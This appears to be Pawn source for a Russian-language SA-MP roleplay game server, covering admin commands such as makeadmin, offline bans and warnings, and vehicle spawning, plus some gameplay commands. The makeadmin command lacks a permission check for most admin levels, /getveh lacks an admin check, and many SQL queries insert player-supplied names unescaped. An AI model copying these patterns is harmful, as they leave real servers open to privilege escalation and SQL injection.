CMD:zmakeadmin(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
    if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /makeadmin [id] [уровень]");
   	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	switch(PlayerInfo[playerid][pAdmin])
	{
	    case 5: if(params[1] < 0 || params[1] > 4) return SendClientMessage(playerid,CGREY,"Уровень от 0 до 4");
   		case 6: if(params[1] < 0 || params[1] > 6) return SendClientMessage(playerid,CGREY,"Уровень от 0 до 6");
   	}
//  if(!PlayerInfo[params[0]][pVKStatus]) return SendClientMessage(playerid,CGREY,"У игрока не включена защита VK!");
	if(params[1] == 0) PlayerInfo[params[0]][pAvig] = 0;
	static const fmt_string[] = "[A] %s выдал игроку %s права администратора %i-го уровня";
	new str[sizeof(fmt_string)+2+MAX_PLAYER_NAME+4+32];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],params[1]);
	SendAdminMessage(CGREY,str);
	SendClientMessage(params[0],CGREY,str);
	if(PlayerInfo[params[0]][pAdmin] == 0) SendClientMessage(params[0],CGREY,str),ShowPlayerDialog(params[0],8,DIALOG_STYLE_INPUT,"Установите пароль","{FFFFFF}Используйте только цифры. Не менее 5 символов.","Готово","Отмена");
    PlayerInfo[params[0]][pAdmin] = params[1];
    SendClientMessage(params[0],CYELLOW,"Вы назначены администратором. Команды администратора: /ah");
	return true;
}
CMD:music(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
	ShowPlayerDialog(playerid, 104, DIALOG_STYLE_INPUT, "Music", "{FFFFFF}Введите URL аудиофайла или потока", "Принять", "Отмена");
	return true;
}
CMD:mp(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	ShowPlayerDialog(playerid, 102, 2, "Мероприятие", "{FFFFFF}Раздать всем здоровье\nЗабрать у всех броню\nЗабрать у всех оружие\nВыдать всем оружие\nВключить аудио стрим" , "Принять", "Отмена");
	return true;
}

function CheckLeaderName()
{
    if(cache_get_row_count(mysql)>0)
    {
        new member = cache_get_field_content_int(0, "id", mysql);
	    SetFractionStr(member, "leader", "None");
		strmid(FracInfo[member][fLeader],"None",0,strlen("None"),MAX_PLAYER_NAME);
	}
	return 1;
}


function OffWarn(playerid,nick[],reason[])
{
    if(cache_get_row_count(mysql)>0)
    {
        new warn = cache_get_field_content_int(0, "warn", mysql);
        new warnid = cache_get_field_content_int(0, "id", mysql);
   	    if(warn >= 2)
		{
			static const fmt_string[] = "У данного человека уже %i варна, используйте /offban";
			new str[sizeof(fmt_string)+3];
			format(str, sizeof(str), fmt_string,warn);
			SendClientMessage(playerid,CGREY,str);
		    return true;
		}
		warn++;
		query = "";
		format(query, sizeof(query), "SELECT * FROM "TABLE_FRACTION" WHERE leader = '%s' LIMIT 1", nick);
		mysql_tquery(mysql, query, "CheckLeaderName");
		
		
		SetPlayerInt(nick, "warn", warn);
		SetPlayerInt(nick, "member", 0);
		SetPlayerInt(nick, "rank", 0);
		SetPlayerInt(nick, "leader", 0);
		static const fmt_string[] = "Администратор %s выдал предупреждение игроку %s [%i/3]. Причина: %s [OFFLINE]";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],nick,warn,reason);
		SendAdminMessage(COLOR_LIGHTRED,str);
		query = "";
		format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
		mysql_tquery(mysql,query);
		new years, months, days;
		getdate(years, months, days);
		new data[32];
		format(data, 32, "%02d.%02d.%04d", days, months, years);
		query = "";
		format(query,sizeof(query),"INSERT INTO `history` ( `nameid`, `adm`, `com`,`time`,`reason` ) VALUES ('%d', '%s', 'Варн', '%s', '%s')",warnid, PlayerInfo[playerid][pSendername],data,reason);
		mysql_tquery(mysql,query);
    }
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
    return 1;
}

CMD:offwarn(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return 1;
	new reason__ban[20];
	if(sscanf(params, "s[25]s[20]", params,reason__ban)) return SendClientMessage(playerid, CGREY, "Введите: /offwarn [ник] [причина]");
	if(GetPlayerID(params) != INVALID_PLAYER_ID) return SendClientMessage(playerid, CGREY, "Игрок онлайн");
	query = "";
	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", params);
	mysql_tquery(mysql, query, "OffWarn", "dss",playerid,params,reason__ban);
/*	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", params);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(!mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
	    mysql_free_result();
	    return true;
	}
	new warn[5],war1;
	new warn6[5],warn5;
	mysql_get_field("warn", warn),war1 = strval(warn);
	if(war1 >= 2)
	{
		static const fmt_string[] = "У данного человека уже %i варна, используйте /offban";
		new str[sizeof(fmt_string)+3];
		format(str, sizeof(str), fmt_string,war1);
		SendClientMessage(playerid,CGREY,str);
	    mysql_free_result();
	    return true;
	}
	new warn2[5],warn3;
	mysql_get_field("member", warn2),warn3 = strval(warn2);
	mysql_get_field("id", warn6),warn5 = strval(warn6);
	
	war1++;
	SetPlayerInt(params, "warn", war1);
	SetPlayerInt(params, "member", 0);
	SetPlayerInt(params, "rank", 0);
	SetPlayerInt(params, "leader", 0);
	static const fmt_string[] = "Администратор %s выдал предупреждение игроку %s [%i/3]. Причина: %s [OFFLINE]";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],params,war1,reason__ban);
	SendAdminMessage(COLOR_LIGHTRED,str);
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
	mysql_tquery(mysql,query);
	new years, months, days;
	getdate(years, months, days);
	new data[32];
	format(data, 32, "%02d.%02d.%04d", days, months, years);
	format(query,sizeof(query),"INSERT INTO `history` ( `nameid`, `adm`, `com`,`time`,`reason` ) VALUES ('%d', '%s', 'Варн', '%s', '%s')",warn5, PlayerInfo[playerid][pSendername],data,reason__ban);
	mysql_tquery(mysql,query);
	mysql_free_result();*/
	return true;
}
function OffLeader(playerid,nick[])
{
    if(cache_get_row_count(mysql)>0)
    {
        new member = cache_get_field_content_int(0, "member", mysql);
        new leader = cache_get_field_content_int(0, "leader", mysql);
        if(!leader) return SendClientMessage(playerid, 0xAFAFAFAA, "Игрок не является лидером");
        SetPlayerInt(nick, "member", 0);
		SetPlayerInt(nick, "rank", 0);
		SetPlayerInt(nick, "leader", 0);
		static const fmt_string[] = "[A] %s снял лидера %s(%s) [OFFLINE]";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],nick,FracInfo[member][fName]);
		SendAdminMessage(CGREY,str);
		query = "";
		format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
		mysql_tquery(mysql,query);
		query = "";
		format(query, sizeof(query), "SELECT * FROM "TABLE_FRACTION" WHERE leader = '%s' LIMIT 1", nick);
		mysql_tquery(mysql, query, "CheckLeaderName");
    }
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
	return 1;
}
CMD:offleader(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] >= 4 && AdminLogged[playerid] == true)
	{
		if(sscanf(params, "s[32]", params)) return SendClientMessage(playerid, CGREY, "Введите: /offleader [ник]");
		if(GetPlayerID(params) != INVALID_PLAYER_ID) return SendClientMessage(playerid, CGREY, "Игрок онлайн");
		query = "";
		format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", params);
		mysql_tquery(mysql, query, "OffLeader", "ds",playerid,params);
	/*	new sas[10],sas1;
		format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", params);
		mysql_tquery(mysql,query);
		mysql_store_result();
		if(!mysql_fetch_row_format(query))
		{
			SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
		    mysql_free_result();
		    return true;
		}
		mysql_get_field("member", sas),sas1 = strval(sas);
		new sas2[10],sas3;
		mysql_get_field("leader", sas2),sas3 = strval(sas2);
		if(sas3 == 0)
		{
			SendClientMessage(playerid, 0xAFAFAFAA, "Игрок не является лидером");
		    mysql_free_result();
		    return true;
		}
		SetPlayerInt(params, "member", 0);
		SetPlayerInt(params, "rank", 0);
		SetPlayerInt(params, "leader", 0);
		static const fmt_string[] = "[A] %s снял лидера %s(%s) [OFFLINE]";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],params,FracInfo[sas1][fName]);
		SendAdminMessage(CGREY,str);
		format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
		mysql_tquery(mysql,query);
		format(query, sizeof(query), "SELECT * FROM "TABLE_FRACTION" WHERE leader = '%s' LIMIT 1", params);
		mysql_tquery(mysql,query);
		mysql_store_result();
		if(mysql_fetch_row_format(query))
		{
			SetFractionStr(sas1, "leader", "None");
			strmid(FracInfo[sas1][fLeader],"None",0,strlen("None"),MAX_PLAYER_NAME);
		}
		mysql_free_result();*/
	}
	return 1;
}
CMD:offstats(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return 1;
	if(sscanf(params, "s[32]", params)) return SendClientMessage(playerid, CGREY, "Введите: /offstats [ник]");
	if(GetPlayerID(params) != INVALID_PLAYER_ID) return SendClientMessage(playerid, CGREY, "Игрок онлайн");
	Stats1(playerid,params);
	return true;
}
function OffBan(playerid,nick[],skok,reason__ban[])
{
    if(cache_get_row_count(mysql)>0)
    {
        new admin = cache_get_field_content_int(0, "admin", mysql);
        if(PlayerInfo[playerid][pAdmin] < admin) return SendClientMessage(playerid,CGREY,"Вы не можете забанить администратора старше Вас");
        new player = cache_get_field_content_int(0, "id", mysql);
        new ip[16];
        cache_get_field_content(0, "ip", ip, mysql);
		new years, months, days;
		getdate(years, months, days);
		new data[16];
		format(data, sizeof(data), "%02d.%02d.%04d", days, months, years);
		query = "";
		format(query, sizeof(query), "INSERT INTO bans (name, whobanned, ip, bandate, time, reason) VALUES ('%s', '%s', '%s', '%s', %d, '%s')", nick, PlayerInfo[playerid][pSendername],ip, data, gettime()+60*60*24*skok, reason__ban);
		mysql_tquery(mysql,query);
		static const fmt_string[] = "Администратор %s забанил игрока %s на %i дней. Причина: %s [OFFLINE]";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],nick,skok,reason__ban);
		SendAdminToAll(COLOR_LIGHTRED,str);
		query = "";
		format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
		mysql_tquery(mysql,query);
		query = "";
		format(query,sizeof(query),"INSERT INTO `history` ( `nameid`, `adm`, `com`,`time`,`reason` ) VALUES ('%d', '%s', 'Бан', '%s', '%s')",player, PlayerInfo[playerid][pSendername],data,reason__ban);
		mysql_tquery(mysql,query);
	}
	else SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
	return 1;
}
CMD:offban(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return 1;
	new reason__ban[20];
	new skok;
	if(sscanf(params, "s[25]is[20]", params,skok, reason__ban)) return SendClientMessage(playerid, CGREY, "Введите: /offban [ник] [кол-во дней] [причина]");
	if(GetPlayerID(params) != INVALID_PLAYER_ID) return SendClientMessage(playerid, CGREY, "Игрок онлайн");
	query = "";
	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", params);
	mysql_tquery(mysql, query, "OffBan", "dsds",playerid, params,skok, reason__ban);
/*	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", params);
	mysql_tquery(mysql,query);
	mysql_store_result();
	new warn6[10];
	if(!mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
	    mysql_free_result();
	    return true;
	}
	mysql_get_field("ip", sasok);
	mysql_get_field("admin", sas),sas1 = strval(sas);
	mysql_get_field("id", warn6);
	if(PlayerInfo[playerid][pAdmin] < sas1)
	{
	 	SendClientMessage(playerid,CGREY,"Вы не можете забанить администратора старше Вас");
	 	mysql_free_result();
	  	return true;
 	}
	new years, months, days;
	getdate(years, months, days);
	new data[16];
	format(data, sizeof(data), "%02d.%02d.%04d", days, months, years);
	format(query, sizeof(query), "INSERT INTO bans (name, whobanned, ip, bandate, time, reason) VALUES ('%s', '%s', '%s', '%s', %d, '%s')", params, PlayerInfo[playerid][pSendername],sasok, data, gettime()+60*60*24*skok, reason__ban);
	mysql_tquery(mysql,query);
	static const fmt_string[] = "Администратор %s забанил игрока %s на %i дней. Причина: %s [OFFLINE]";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],params,skok,reason__ban);
	SendAdminToAll(COLOR_LIGHTRED,str);
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
	mysql_tquery(mysql,query);
	format(query,sizeof(query),"INSERT INTO `history` ( `nameid`, `adm`, `com`,`time`,`reason` ) VALUES ('%d', '%s', 'Бан', '%s', '%s')",strval(warn6), PlayerInfo[playerid][pSendername],data,reason__ban);
	mysql_tquery(mysql,query);
	mysql_free_result();*/
	return 1;
}
CMD:skin(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /skin [id игрока] [id скина]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(params[1] < 1 || params[1] > 311) return SendClientMessage(playerid,CGREY,"Скины от 1 до 311");
	PlayerInfo[params[0]][pModel] = params[1];
	SetPlayerSkin(params[0],params[1]);
	return true;
}
CMD:tempskin(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /tempskin [id игрока] [id скина]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(params[1] < 1 || params[1] > 311) return SendClientMessage(playerid,CGREY,"Скины от 1 до 311");
	SetPlayerSkin(params[0],params[1]);
	return true;
}

CMD:getveh(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /getveh [id (411/522)]");
	if(params[0] != 411 && params[0] != 522) return SendClientMessage(playerid, CGREY, "Используйте: /getveh [id (411/522)]");
	if(admincar[playerid][0]) DestroyVehicle(admincar[playerid][0]);
	new Float:X,Float:Y,Float:Z,Float:A;
	GetPlayerPos(playerid, X,Y,Z);
	GetPlayerFacingAngle(playerid,A);
	new carid = CreateVehicle(params[0], X,Y,Z, A, params[1], params[2], 60000);
	PutPlayerInVehicle(playerid,carid,0);
	GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_ON,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
	Engine[GetPlayerVehicleID(playerid)] = true;
	Lights[GetPlayerVehicleID(playerid)] = true;
	veh__pos[carid][0] = X;
	veh__pos[carid][1] = Y;
	veh__pos[carid][2] = Z;
	Locked[carid] = -1;
	veh__pos[carid][3] = A;
	Fuel[carid] = 100;
	admincar[playerid][0]=carid;
	return 1;
}
CMD:veh(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "iii", params[0],params[1],params[2])) return SendClientMessage(playerid, CGREY, "Используйте: /veh [id] [цвет 1] [цвет 2]");
	if(params[0] < 400 || params[0] > 611) return SendClientMessage(playerid,CGREY,"Машины от 400 до 611");
	new Float:X,Float:Y,Float:Z,Float:A;
	GetPlayerPos(playerid, X,Y,Z);
	GetPlayerFacingAngle(playerid,A);
	new carid = CreateVehicle(params[0], X,Y,Z, A, params[1], params[2], 60000);
	if(GetPlayerVirtualWorld(playerid)) SetVehicleVirtualWorld(carid,GetPlayerVirtualWorld(playerid));
	if(GetPlayerInterior(playerid)) LinkVehicleToInterior(carid,GetPlayerInterior(playerid));
	PutPlayerInVehicle(playerid,carid,0);
	GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_ON,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
	SetEngine(playerid,GetPlayerVehicleID(playerid),true);
	SetLights(playerid,GetPlayerVehicleID(playerid),true);
	veh__pos[carid][0] = X;
	veh__pos[carid][1] = Y;
	veh__pos[carid][2] = Z;
	Locked[carid] = -1;
	veh__pos[carid][3] = A;
	Fuel[carid] = 100;
	new kok = 0;
	for(new i = 1;i <= 100;i++)
	{
		if(admincar[playerid][i]) continue;
		admincar[playerid][i]=carid;
		kok = i;
		break;
	}
	if(kok == 0)
	{
	    SendClientMessage(playerid,CLIGHTRED,"Все слоты для машины заняты");
	    DestroyVehicle(carid);
	}
	else
	{
    	static const fmt_string[] = "Для удаления автомобиля введите {f7ae11}/delveh %i";
		new str[sizeof(fmt_string)+3];
		format(str, sizeof(str), fmt_string,kok);
		SendClientMessage(playerid,-1,str);
	}
	return true;
}
CMD:cc(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false ) return true;
	static const fmt_string[] = "Администратор %s очистил чат";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
	for(new o; o < 50; o++)
	{
		if(o < 49) SendClientMessageToAll(-1, "");
		else
		{
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
			SendClientMessageToAll(-1,str);
		}
	}
	return true;
}
CMD:o(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "s[100]", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /o [текст]");
	static const nameadm[4][25] = {"Администратор","Гл. Администратор","Спец. Администратор","Основатель"};
	static const fmt_string[] = "<< %s %s: %s >>";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+100];
	format(str, sizeof(str), fmt_string,nameadm[PlayerInfo[playerid][pAdmin]-4],PlayerInfo[playerid][pSendername],params[0]);
	SendClientMessageToAll(0xE0FFFFAA,str);
	return true;
}
CMD:msg(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "s[100]", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /msg [текст]");
	static const nameadm[4][25] = {"Администратор","Гл. Администратор","Спец. Администратор","Основатель"};
	static const fmt_string[] = "%s %s: %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+100];
	format(str, sizeof(str), fmt_string,nameadm[PlayerInfo[playerid][pAdmin]-4],PlayerInfo[playerid][pSendername],params[0]);
	SendClientMessageToAll(0xF7D358FF,str);
	return true;
}
CMD:hp(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /hp [id] [кол-во]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	SetHealth(params[0],params[1]);
	static const fmt_string[] = "Администратор {f7ae11}%s{FFFFFF} выдал вам здоровье";
	new str[sizeof(fmt_string)+2+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
	SendClientMessage(params[0],-1,str);
	return true;
}
CMD:fix(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false ) return true;
    if(IsPlayerInAnyVehicle(playerid)) RepairVehicle(GetPlayerVehicleID(playerid));
	return true;
}
CMD:dtable(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /dtable [id слота [0-20]]");
 	if(ctable[playerid][params[0]] == 0) return SendClientMessage(playerid,CGREY,"Вы не создавали табличку");
	DestroyDynamicObject(ctable[playerid][params[0]]);
	ctable[playerid][params[0]] = 0;
	static const fmt_string[] = "Вы удалили табличку в слоте {f7ae11}%i{FFFFFF}";
	new str[sizeof(fmt_string)+3];
	format(str, sizeof(str), fmt_string,params[0]);
	SendClientMessage(playerid,-1,str);
	return true;
}
CMD:ctable(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	new raz;
	if(sscanf(params, "is[100]",raz,params)) return SendClientMessage(playerid, CGREY, "Введите: /ctable [размер[1-3]] [текст]");
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid,x,y,z);
	new tabl;
	switch(raz)
	{
		case 1: tabl = CreateDynamicObject(2722, x+1, y+1, z+1, 0, 0, 0, -1,-1,-1,300.0);
		case 2: tabl = CreateDynamicObject(2789, x+1, y+1, z+1, 0, 0, 0, -1,-1,-1 ,300.0);
		case 3: tabl = CreateDynamicObject(4238, x+1, y+1, z+1, 0, 0, 0, -1,-1,-1, 300.0);
	}
	new kok = 0;
	for(new i = 1;i < 20;i++)
	{
		if(ctable[playerid][i]) continue;
		ctable[playerid][i]= tabl;
		kok = i;
		break;
	}
	if(kok == 0)
	{
	    SendClientMessage(playerid,CWHITE,"Все слоты для табличек заняты");
	    DestroyObject(tabl);
	}
	else
	{
		new buffer[256];
	 	format(buffer,sizeof(buffer),"%s",params);
	 	//SetDynamicObjectMaterialText(ctable[playerid][kok], 0, buffer, OBJECT_MATERIAL_SIZE_256x128, "Arial", fontsize = 24, bold = 1, fontcolor = 0xFFFFFFFF, backcolor = 0, textalignment = 0);
		SetDynamicObjectMaterialText(ctable[playerid][kok], 0, buffer, OBJECT_MATERIAL_SIZE_256x128, "Arial",25,0,0xFF0000FF,0xFFFFFFFF,OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
		EditDynamicObject(playerid,ctable[playerid][kok]);
		static const fmt_string[] = "Для удаления таблички введите {f7ae11}/dtable %i";
		new str[sizeof(fmt_string)+3];
		format(str, sizeof(str), fmt_string,kok);
		SendClientMessage(playerid,-1,str);
	}
	return true;
}

//=============================== [COMMAND START] =====================================
CMD:sellbizgos(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
	if(GetPlayerBiz(playerid))
	{
		static const fmt_string2[] = "{FFFFFF}Вы действительно хотите продать свой бизнес\nи получить в замен %d% от гос. стоимости?\nВы получите:{f7ae11}\n$%i{FFFFFF}\nОтдадите:\n{f7ae11}%s";
		new str2[sizeof(fmt_string2)+32+10];
		format(str2, sizeof(str2), fmt_string2,(PlayerInfo[playerid][pVip] > gettime()) ? ("90") : ("70"),(PlayerInfo[playerid][pVip] > gettime()) ? (GetProcent(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice],1)) : (GetProcent(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice])),BizInfo[GetPVarInt(playerid,"PlayerBiz")][bName]);
		ShowPlayerDialog(playerid,136,DIALOG_STYLE_MSGBOX,"Продажа дома",str2,"Да","Нет");
	}
	return true;
}
CMD:sellhousegos(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
	if(GetPlayerHouse(playerid))
	{
		static const fmt_string2[] = "{FFFFFF}Вы действительно хотите продать свой дом\nи получить в замен %d% от гос. стоимости?\nВы получите:{f7ae11}\n$%i{FFFFFF}\nОтдадите:\n{f7ae11}Дом №%i(%s класса)";
		new str2[sizeof(fmt_string2)+32+10];
		format(str2, sizeof(str2), fmt_string2,(PlayerInfo[playerid][pVip] > gettime()) ? ("90") : ("70"),(PlayerInfo[playerid][pVip] > gettime()) ? (GetProcent(HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost],1)) : (GetProcent(HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost])),GetPVarInt(playerid,"PlayerHouse"),HInfo[GetPVarInt(playerid,"PlayerHouse")][hClass]);
		ShowPlayerDialog(playerid,112,DIALOG_STYLE_MSGBOX,"Продажа дома",str2,"Да","Нет");
	}
	return true;
}

CMD:untie(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /untie [id игрока]");
    if(params[0] == playerid) return SendClientMessage(playerid,CGREY,"Вы не можете развязать самого себя");
    if(GetPVarInt(params[0],"Tie") == 0) return SendClientMessage(playerid,CGREY,"Игрок не связан");
    DeletePVar(params[0],"Tie");
    TogglePlayerControllable(params[0], 1);
    static const fmt_string[] = "%s развязывает %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+100];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
	SetPlayerChatBubble(playerid, "развязывает", COLOR_PURPLE, 30.0, 7000);
	return 1;
}
CMD:tie(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(IsAGang(playerid) || IsAMafia(playerid))
	{
	    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGREY,"Вы не в транспорте");
	    if(PlayerInfo[playerid][pTie] < 1) return SendClientMessage(playerid,CGREY,"У Вас нет верёвки");
	    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /tie [id игрока]");
	    if(GetPVarInt(params[0],"Tie") > 0) return SendClientMessage(playerid,CGREY,"Игрок уже связан");
		if(params[0] == playerid) return SendClientMessage(playerid,CGREY,"Вы не можете связать самого себя");
		if(GetPlayerVehicleID(playerid) != GetPlayerVehicleID(params[0])) return SendClientMessage(playerid,CGREY,"Игрок не с вами в транспорте");
		PlayerInfo[playerid][pTie]--;
		InvMinus(playerid,315,1);
		SetPVarInt(params[0],"Tie",1);
	    TogglePlayerControllable(params[0], 0);
	    static const fmt_string[] = "%s связывает %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+100];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
		SetPlayerChatBubble(playerid, "связывает", COLOR_PURPLE, 30.0, 7000);
    }
    return 1;
}
CMD:smoke(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
    if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_SMOKE_CIGGY) return true;
	if(PlayerInfo[playerid][pSmoke] < 1) return SendClientMessage(playerid,CGREY,"У Вас нет сигар");
 	PlayerInfo[playerid][pSmoke]--;
	InvMinus(playerid,I_SMOKE,1);
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_SMOKE_CIGGY),SetPVarInt(playerid,"UseSp",13);
	SendClientMessage(playerid,CGREEN,"Нажимайте ЛКМ, для того чтобы курить. Сигарета расчитана на 13 раз");
	return 1;
}

CMD:addradar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return 1;
	new sk;
    if(sscanf(params, "is[32]", sk,params)) return SendClientMessage(playerid, CGREY, "Введите: /addradar [скорость] [название]");
    new Float:X, Float:Y, Float:Z;
    SetPVarInt(playerid, "addrad", 1);
    SetPVarInt(playerid, "speed", sk);
    SetPVarString(playerid, "nameradar", params);
    GetPlayerPos(playerid, X, Y, Z);
    TOTALRADAR++;
    RadarInfo[TOTALRADAR][rObj] = CreateObject(18880, X+1, Y+1, Z+1, 0.0, 0.0, 0.0);
    EditObject(playerid, RadarInfo[TOTALRADAR][rObj]);
    return true;
}

